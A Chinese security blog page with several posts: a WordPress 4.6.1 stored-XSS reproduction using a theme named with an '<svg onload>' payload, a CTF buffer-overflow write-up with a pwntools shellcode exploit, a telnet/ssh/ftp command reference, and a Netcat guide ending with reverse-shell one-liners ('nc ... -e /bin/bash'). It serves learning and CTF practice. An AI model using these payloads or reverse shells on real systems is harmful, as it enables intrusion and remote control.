<p>​    首先，我们来了解下<code>wordresss</code>，<a href="https://wordpress.org/" target="_blank" rel="noopener">WordPress</a>是一个以<code>PHP</code>和<code>MySQL</code>为平台的自由开源的博客软件和内容管理系统，<code>WordPress</code>具有插件架构和模板系统，截至2018年4月，排名前1000万的网站超过30.6%使用<code>WordPress</code><a href="https://zh.wikipedia.org/wiki/WordPress#cite_note-6" target="_blank" rel="noopener">[1]</a>。<code>WordPress</code>是最受欢迎的网站<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">内容管理系统</a>，<code>WordPress</code>在最着名的网络发布阶段中脱颖而出。如今，它被使用在超过7000万个站点上。</p>
<p>​    <code>WordPress</code>用户可以安装和切换主题。主题可让用户不改变博客内容和结构的情况下更改界面和<code>WordPress</code>站点的功能。主题可以在<code>WordPress</code>的“外观”管理工具中安装，或者通过<code>FTP</code>上传至主题文件夹。也可以通过编辑主题中的<code>PHP</code>和<code>HTML</code>代码自定义主题。而漏洞是一个后台存储型<code>XSS</code>漏洞，可以通过上传恶意构造的主题文件来触发。【上述内容来自维基百科】</p>
<p>0x01 环境搭建</p>
<p>​    本来这个环境是很容易的搭的啊，但刚开始就是一直报错，到最后一直改了又改，最终还是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: Cannot link to a non running container</span><br></pre></td></tr></table></figure>
<p>到最后一直改了又改，最终还是报错，无奈重新搭建，果然重建是第一生产力。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 0027a12dab6d /bin/bash  </span><br><span class="line">vim /etc/mysql/conf.d/mysql.cnf</span><br><span class="line">Redhat停止防火墙：service iptables stop</span><br><span class="line">Ubuntu停止防火墙：ufw disable</span><br></pre></td></tr></table></figure>
<p>最后终于搭建完成，命令如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull wordpress:4.6.1</span><br><span class="line">docker pull mysql</span><br><span class="line">docker run --name wp-mysql -e MYSQL_ROOT_PASSWORD=fans0n -d mysql</span><br><span class="line">docker run --name wp-wordpress --link wp-mysql:mysql -p 8080:80 -d wordpress:4.6.1</span><br></pre></td></tr></table></figure>
<p>0x02 漏洞复现</p>
<p>​    首先，我们先下载一个主题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.wordpress.org/theme/illdy.1.0.29.zip</span><br><span class="line">unzip -x illdy.1.0.29.zip</span><br></pre></td></tr></table></figure>
<p>​    并且对其<code>illdy/style.css</code>进行如下更改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Theme Name: &lt;svg onload=alert(1234)&gt;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p><img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/theme-n.PNG" alt=""></p>
<p>​    接着更改文件夹名字再打包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv illdy &quot;&lt;svg onload=alert(fans0n)&gt;&quot;</span><br><span class="line">zip -r theme.zip &quot;&lt;svg onload=alert(fans0n)&gt;&quot;</span><br></pre></td></tr></table></figure>
<p>​    <img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/theme.PNG" alt=""><img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/themeChange.PNG" alt=""></p>
<p>​    构造好之后我们登录后台上传该主题文件，同时开始动态调试。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/websec/">websec</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/22/ctf-姿势/"><span>ctf-姿势</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/22/ctf-姿势/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-22T14:03:22.000Z">
          2019-03-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        
      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/03/Pwn/"><span>Pwn</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/03/Pwn/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-03T11:56:05.000Z">
          2019-03-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>周末看到了这道题，学习记录下来！</p>
<p>首先我们先来看源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Welcome to zsctf!\n"</span>, <span class="number">21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buffer, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    welcome();</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过看源码，能明显的看出，read()函数处存在明显栈溢出，接着我们来运行下程序，熟悉程序的各个功能。</p>
<p><img src="/2019/03/03/Pwn/1.PNG" alt=""></p>
<p>检查该程序打开的保护措施</p>
<p><img src="/2019/03/03/Pwn/3.PNG" alt=""></p>
<p>NX保护关闭，就更容易利用了</p>
<p>我们就可以来捋下大致的利用思路，通过read()函数，把shellcode读进去BBS段</p>
<p>接下来，我们就可以操作了；</p>
<p>用cyclic 100生成100个字符来覆盖返回地址，并将这些字符输入给程序来得到无效地址</p>
<p><img src="/2019/03/03/Pwn/5.PNG" alt=""></p>
<p>结合cyclic -l  无效地址来得到返回地址，并将shellcode放入该返回地址处</p>
<p><img src="/2019/03/03/Pwn/6.PNG" alt=""></p>
<p><img src="/2019/03/03/Pwn/8.PNG" alt=""></p>
<p>通过ida找到bbs段的地址</p>
<p><img src="/2019/03/03/Pwn/9.PNG" alt=""></p>
<p>结合pwntools，构造rop，写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">bss_add = <span class="number">0x804A024</span>   <span class="comment">#通过ida找到的bbs段的地址</span></span><br><span class="line">proc = <span class="string">'./static'</span></span><br><span class="line">context.binary = proc</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p = process(proc)</span><br><span class="line">p.recvuntil(<span class="string">"Welcome to zsctf!"</span>)</span><br><span class="line">rop = ROP(proc)</span><br><span class="line">rop.read(<span class="number">0</span>,bss_add+<span class="number">0x100</span>,len(shellcode))</span><br><span class="line">rop.call(bss_add+<span class="number">0x100</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">20</span> + str(rop))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最终成功获得shell</p>
<p><img src="/2019/03/03/Pwn/7.PNG" alt=""></p>
<p>本文为听b站莫笑老师的笔记记录吧</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/01/06/一些常用服务的linux-command/"><span>一些常用服务的linux-command</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/01/06/一些常用服务的linux-command/" rel="bookmark">
        <time class="entry-date published" datetime="2019-01-06T10:22:30.000Z">
          2019-01-06
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h1><p>登录远程主机和管理(测试ip端口是否连通) </p>
<p><strong>telnet命令</strong> 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。</p>
<p><strong>语法：</strong></p>
<p>telnet(选项)(参数) </p>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-8：允许使用8位字符资料，包括输入与输出；</span><br><span class="line">-a：尝试自动登入远端系统；</span><br><span class="line">-b&lt;主机别名&gt;：使用别名指定远端主机名称；</span><br><span class="line">-c：不读取用户专属目录里的.telnetrc文件；</span><br><span class="line">-d：启动排错模式；</span><br><span class="line">-e&lt;脱离字符&gt;：设置脱离字符；</span><br><span class="line">-E：滤除脱离字符；</span><br><span class="line">-f：此参数的效果和指定&quot;-F&quot;参数相同；</span><br><span class="line">-F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机；</span><br><span class="line">-k&lt;域名&gt;：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名；</span><br><span class="line">-K：不自动登入远端主机；</span><br><span class="line">-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；</span><br><span class="line">-L：允许输出8位字符资料；</span><br><span class="line">-n&lt;记录文件&gt;：指定文件记录相关信息；</span><br><span class="line">-r：使用类似rlogin指令的用户界面；</span><br><span class="line">-S&lt;服务类型&gt;：设置telnet连线所需的ip TOS信息；</span><br><span class="line">-x：假设主机有支持数据加密的功能，就使用它；</span><br><span class="line">-X&lt;认证形态&gt;：关闭指定的认证形态。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>远程主机：指定要登录进行管理的远程主机；</li>
<li>端口：指定TELNET协议使用的端口号。</li>
</ul>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 192.168.2.10</span><br><span class="line">Trying 192.168.2.10...</span><br><span class="line">Connected to 192.168.2.10 (192.168.2.10).</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line"></span><br><span class="line">    localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1)</span><br><span class="line"></span><br><span class="line">login: root</span><br><span class="line">Password:</span><br><span class="line">Login incorrect</span><br></pre></td></tr></table></figure>
<p>一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 192.168.188.132</span><br><span class="line">Trying 192.168.188.132...</span><br><span class="line">telnet: connect to address 192.168.188.132: Connection refused</span><br><span class="line">telnet: Unable to connect to remote host</span><br></pre></td></tr></table></figure>
<p>处理这种情况方法：</p>
<ol>
<li><p>确认ip地址是否正确？</p>
</li>
<li><p>确认ip地址对应的主机是否已经开机？</p>
</li>
<li><p>如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看）</p>
</li>
<li><p>如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行）</p>
</li>
<li><p>如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看）</p>
<p><strong>启动telnet服务</strong></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure>
<p>配置参数，通常的配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service telnet</span><br><span class="line">&#123;</span><br><span class="line">    disable = no #启用</span><br><span class="line">    flags = REUSE #socket可重用</span><br><span class="line">    socket_type = stream #连接方式为TCP</span><br><span class="line">    wait = no #为每个请求启动一个进程</span><br><span class="line">    user = root #启动服务的用户为root</span><br><span class="line">    server = /usr/sbin/in.telnetd #要激活的进程</span><br><span class="line">    log_on_failure += USERID #登录失败时记录登录用户名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果要配置允许登录的客户端列表，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only_from = 192.168.0.2 #只允许192.168.0.2登录</span><br></pre></td></tr></table></figure>
<p>如果要配置禁止登录的客户端列表，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no_access = 192.168.0.&#123;2,3,4&#125; #禁止192.168.0.2、192.168.0.3、192.168.0.4登录</span><br></pre></td></tr></table></figure>
<p>如果要设置开放时段，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P）</span><br></pre></td></tr></table></figure>
<p>如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind = 192.168.0.2</span><br></pre></td></tr></table></figure>
<p>各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf）</p>
<p>配置端口，修改services文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/services</span><br></pre></td></tr></table></figure>
<p>找到以下两句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet 23/tcp</span><br><span class="line">telnet 23/udp</span><br></pre></td></tr></table></figure>
<p>如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。</p>
<p>启动服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure>
<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>openssh套件中的客户端连接工具</p>
<p><strong>ssh命令</strong> 是openssh套件中的客户端连接工具，可以给予ssh加密协议实现安全的远程登录服务器。</p>
<p><strong>语法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh(选项)(参数)</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-1：强制使用ssh协议版本1；</span><br><span class="line">-2：强制使用ssh协议版本2；</span><br><span class="line">-4：强制使用IPv4地址；</span><br><span class="line">-6：强制使用IPv6地址；</span><br><span class="line">-A：开启认证代理连接转发功能；</span><br><span class="line">-a：关闭认证代理连接转发功能；</span><br><span class="line">-b：使用本机指定地址作为对应连接的源ip地址；</span><br><span class="line">-C：请求压缩所有数据；</span><br><span class="line">-F：指定ssh指令的配置文件；</span><br><span class="line">-f：后台执行ssh指令；</span><br><span class="line">-g：允许远程主机连接主机的转发端口；</span><br><span class="line">-i：指定身份文件；</span><br><span class="line">-l：指定连接远程服务器登录用户名；</span><br><span class="line">-N：不执行远程指令；</span><br><span class="line">-o：指定配置选项；</span><br><span class="line">-p：指定远程服务器上的端口；</span><br><span class="line">-q：静默模式；</span><br><span class="line">-X：开启X11转发功能；</span><br><span class="line">-x：关闭X11转发功能；</span><br><span class="line">-y：开启信任X11转发功能。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>远程主机：指定要连接的远程ssh服务器；</li>
<li>指令：要在远程ssh服务器上执行的指令。</li>
</ul>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ssh 用户名@远程服务器地址</span><br><span class="line">ssh user1@172.24.210.101</span><br><span class="line"># 指定端口</span><br><span class="line">ssh -p 2211 root@140.206.185.170</span><br><span class="line"></span><br><span class="line"># ssh 大家族</span><br><span class="line">ssh user@ip -p22 # 默认用户名为当前用户名，默认端口为 22</span><br><span class="line">ssh-keygen # 为当前用户生成 ssh 公钥 + 私钥</span><br><span class="line">ssh-keygen -f keyfile -i -m key_format -e -m key_format # key_format: RFC4716/SSH2(default) PKCS8 PEM</span><br><span class="line">ssh-copy-id user@ip:port # 将当前用户的公钥复制到需要 ssh 的服务器的 ~/.ssh/authorized_keys，之后可以免密登录</span><br></pre></td></tr></table></figure>
<h1 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h1><p>用来设置文件系统相关功能</p>
<p><strong>ftp命令</strong> 用来设置文件系统相关功能。ftp服务器在网上较为常见，Linux ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux ftp命令的一些经常使用的命令，相信掌握了这些使用Linux进行ftp操作将会非常容易。</p>
<p><strong>语法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp(选项)(参数)</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-d：详细显示指令执行过程，便于排错或分析程序执行的情况；</span><br><span class="line">-i：关闭互动模式，不询问任何问题；</span><br><span class="line">-g：关闭本地主机文件名称支持特殊字符的扩充特性；</span><br><span class="line">-n：不使用自动登录；</span><br><span class="line">-v：显示指令执行过程。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<p>主机：指定要连接的FTP服务器的主机名或ip地址。</p>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ascii  # 设定以ASCII方式传送文件(缺省值) </span><br><span class="line">ftp&gt; bell   # 每完成一次文件传送,报警提示. </span><br><span class="line">ftp&gt; binary # 设定以二进制方式传送文件. </span><br><span class="line">ftp&gt; bye    # 终止主机FTP进程,并退出FTP管理方式. </span><br><span class="line">ftp&gt; case   # 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母. </span><br><span class="line">ftp&gt; cd     # 同UNIX的CD命令. </span><br><span class="line">ftp&gt; cdup   # 返回上一级目录. </span><br><span class="line">ftp&gt; chmod  # 改变远端主机的文件权限. </span><br><span class="line">ftp&gt; close  # 终止远端的FTP进程,返回到FTP命令状态, 所有的宏定义都被删除. </span><br><span class="line">ftp&gt; delete # 删除远端主机中的文件. </span><br><span class="line">ftp&gt; dir [remote-directory] [local-file] # 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件. </span><br><span class="line">ftp&gt; get [remote-file] [local-file] # 从远端主机中传送至本地主机中. </span><br><span class="line">ftp&gt; help [command] # 输出命令的解释. </span><br><span class="line">ftp&gt; lcd # 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录. </span><br><span class="line">ftp&gt; ls [remote-directory] [local-file] # 同DIR. </span><br><span class="line">ftp&gt; macdef                 # 定义宏命令. </span><br><span class="line">ftp&gt; mdelete [remote-files] # 删除一批文件. </span><br><span class="line">ftp&gt; mget [remote-files]    # 从远端主机接收一批文件至本地主机. </span><br><span class="line">ftp&gt; mkdir directory-name   # 在远端主机中建立目录. </span><br><span class="line">ftp&gt; mput local-files # 将本地主机中一批文件传送至远端主机. </span><br><span class="line">ftp&gt; open host [port] # 重新建立一个新的连接. </span><br><span class="line">ftp&gt; prompt           # 交互提示模式. </span><br><span class="line">ftp&gt; put local-file [remote-file] # 将本地一个文件传送至远端主机中. </span><br><span class="line">ftp&gt; pwd  # 列出当前远端主机目录. </span><br><span class="line">ftp&gt; quit # 同BYE. </span><br><span class="line">ftp&gt; recv remote-file [local-file] # 同GET. </span><br><span class="line">ftp&gt; rename [from] [to]     # 改变远端主机中的文件名. </span><br><span class="line">ftp&gt; rmdir directory-name   # 删除远端主机中的目录. </span><br><span class="line">ftp&gt; send local-file [remote-file] # 同PUT. </span><br><span class="line">ftp&gt; status   # 显示当前FTP的状态. </span><br><span class="line">ftp&gt; system   # 显示远端主机系统类型. </span><br><span class="line">ftp&gt; user user-name [password] [account] # 重新以别的用户名登录远端主机. </span><br><span class="line">ftp&gt; ? [command] # 同HELP. [command]指定需要帮助的命令名称。如果没有指定 command，ftp 将显示全部命令的列表。</span><br><span class="line">ftp&gt; ! # 从 ftp 子系统退出到外壳。</span><br></pre></td></tr></table></figure>
<p>关闭FTP连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bye</span><br><span class="line">exit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<p>下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get readme.txt # 下载 readme.txt 文件</span><br><span class="line">ftp&gt; mget *.txt     # 下载</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; put /path/readme.txt # 上传 readme.txt 文件</span><br><span class="line">ftp&gt; mput *.txt           # 可以上传多个文件</span><br></pre></td></tr></table></figure>
<p>内容来自【<a href="https://wangchujiang.com/linux-command/c/ssh.html】" target="_blank" rel="noopener">https://wangchujiang.com/linux-command/c/ssh.html】</a></p>
<p>整理为笔记以记之</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Tools/">Tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/12/03/Netcat-工具使用/"><span>Netcat 工具使用</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/12/03/Netcat-工具使用/" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-03T15:06:06.000Z">
          2018-12-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h4 id="Netcat的工具使用总结："><a href="#Netcat的工具使用总结：" class="headerlink" title="Netcat的工具使用总结："></a>Netcat的工具使用总结：</h4><p>一，Netcat Banner获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port]</span><br></pre></td></tr></table></figure>
<p>二，文件传输</p>
<p>例如我们想在目标主机上执行远程命令，所以需要将文件从攻击主机传输到目标主机。首先，设置一个侦听器，并从攻击主机连接到它。使用端口8888用于此目的，将该文件安全保存到桌面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888 &gt; 文件路径</span><br></pre></td></tr></table></figure>
<p>在攻击机上，我们连接到该8888端口并发送文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] &lt; 文件路径</span><br></pre></td></tr></table></figure>
<p>三，Bind Shells &amp;Reverse Shells</p>
<p>在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p>
<p>Reverse Shell:</p>
<p>1.设置一个Netcat侦听器，（我们侦听端口8888）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
<p>2.接下来我们在目标主机上执行下面的命令来连接我们的攻击主机（记住我们在这个攻击主机上执行了远程代码）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] -e /bin/bash    &lt;for linux&gt;</span><br><span class="line">nc.exe [ip-address] [port] -e cmd.exe  &lt;for windows&gt;</span><br></pre></td></tr></table></figure>
